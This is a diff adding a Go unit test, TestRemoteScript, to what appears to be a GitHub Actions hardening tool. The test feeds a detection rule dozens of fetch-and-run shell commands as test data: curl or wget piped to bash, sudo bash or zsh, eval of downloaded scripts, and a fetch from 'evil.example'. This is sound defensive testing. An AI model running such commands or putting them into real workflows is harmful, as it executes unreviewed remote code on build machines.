@@ -3,6 +3,7 @@ package rules
 import (
 	"os"
 	"path/filepath"
+	"strings"
 	"testing"
 
 	"gha-hardener/internal/workflow"
@@ -184,6 +185,69 @@ func TestPAT(t *testing.T) {
 			}
 		})
 	}
+}
+
+func TestRemoteScript(t *testing.T) {
+	const sha = "0123456789abcdef0123456789abcdef01234567"
+	pinned := "https://raw.githubusercontent.com/owner/repo/" + sha + "/script.sh"
+	cases := []struct {
+		name string
+		src  string
+		file string
+		want int
+	}{
+		{"good", "", "remote-script/good.yml", 0},
+		{"bad", "", "remote-script/bad.yml", 1},
+		{"pipe bash", runYAML("curl -fsSL https://example.com/a.sh | bash"), "", 1},
+		{"wget zsh", runYAML("wget -qO- https://example.com/a.sh | zsh"), "", 1},
+		{"sudo", runYAML("curl -fsSL https://example.com/a.sh | sudo -E bash"), "", 1},
+		{"dash", runYAML("wget -qO- https://example.com/a.sh | dash"), "", 1},
+		{"eval double quote", runYAML(`eval "$(curl https://example.com/a.sh)"`), "", 1},
+		{"shell -c", runYAML(`bash -c 'curl https://example.com/a.sh | bash'`), "", 1},
+		{"continuation in name", "on: push\njobs:\n  build:\n    steps:\n      - run: |\n          cu\\\n          rl https://example.com/a.sh | bash\n", "", 1},
+		{"hash inside word", runYAML("x=foo#bar; curl https://example.com/a.sh | bash"), "", 1},
+		{"comment hides pipe", runYAML("curl https://example.com/a.sh # note | bash"), "", 0},
+		{"quoted echo", runYAML(`echo "bash <(curl https://example.com/a.sh)"`), "", 0},
+		{"download then file", runYAML("curl -fsSL https://example.com/a.sh -o /tmp/x && bash /tmp/x"), "", 0},
+		{"pinned raw", runYAML("bash <(curl -fsSL " + pinned + ")"), "", 0},
+		{"pinned github", runYAML("curl -fsSL https://github.com/owner/repo/raw/" + sha + "/script.sh | bash"), "", 0},
+		{"evil hex host", runYAML("bash <(curl -fsSL https://evil.example/" + sha + "/latest.sh)"), "", 1},
+		{"variable", runYAML(`curl -fsSL "$URL" | bash`), "", 1},
+		{"mixed urls", runYAML("curl " + pinned + " https://example.com/b.sh | bash"), "", 1},
+		{"url flag", runYAML("curl --url=https://example.com/a.sh | sh"), "", 1},
+		{"or not pipe", runYAML("curl https://example.com/a.sh || bash"), "", 0},
+		{"not curl", runYAML("mycurl https://example.com/a.sh | bash"), "", 0},
+		{"hex after main", runYAML("bash <(curl -fsSL https://raw.githubusercontent.com/owner/repo/main/" + sha + "/install.sh)"), "", 1},
+		{"assignment prefix", runYAML("X=1 curl -fsSL https://example.com/a.sh | bash"), "", 1},
+		{"eval joins args", runYAML("eval bash '<(curl https://example.com/a.sh)'"), "", 1},
+		{"newline after pipe", runYAML("curl -fsSL https://example.com/a.sh |\nbash"), "", 1},
+		{"sudo user", runYAML("curl -fsSL https://example.com/a.sh | sudo -u root bash"), "", 1},
+		{"shell option before -c", runYAML("bash -o posix -c 'curl https://example.com/a.sh | bash'"), "", 1},
+		{"pipe amp", runYAML("curl -fsSL https://example.com/a.sh |& bash"), "", 1},
+		{"norc is not -c", runYAML("bash --norc 'curl https://example.com/a.sh | bash'"), "", 0},
+	}
+	for _, tc := range cases {
+		t.Run(tc.name, func(t *testing.T) {
+			got := Remote(loadWorkflow(t, tc.file, tc.src))
+			if len(got) != tc.want {
+				t.Fatalf("findings %#v", got)
+			}
+			if tc.want == 1 && got[0].Message != remoteMessage {
+				t.Fatalf("message %q", got[0].Message)
+			}
+		})
+	}
+}
+
+func runYAML(script string) string {
+	var b strings.Builder
+	b.WriteString("on: push\njobs:\n  build:\n    steps:\n      - run: |\n")
+	for _, line := range strings.Split(script, "\n") {
+		b.WriteString("          ")
+		b.WriteString(line)
+		b.WriteString("\n")
+	}
+	return b.String()
 }
 
 func TestAllCapsFindings(t *testing.T) {
